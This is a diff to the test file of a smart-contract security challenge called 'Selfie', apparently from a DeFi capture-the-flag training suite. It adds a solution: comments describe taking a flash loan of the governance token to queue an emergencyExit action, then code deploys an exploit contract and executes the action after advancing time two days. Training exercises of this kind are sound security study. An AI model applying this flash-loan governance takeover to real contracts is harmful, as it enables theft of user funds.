@@ -39,6 +39,18 @@ describe('[Challenge] Selfie', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+      // token and governance token are the same
+      // take a flashLoan > TOKEN_INITIAL_SUPPLY / 2
+      // queueAction emergencyExit
+      // re-pay flash flashLoan
+      // move forward for 2 days
+      // execute action
+      
+      //deploy exploit
+      const exploit = await (await ethers.getContractFactory('ExploitSelfiePool', player)).deploy(pool.address, token.address);
+      await exploit.hackIt();
+      await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days
+      await governance.executeAction(await exploit.actionId());
     });
 
     after(async function () {
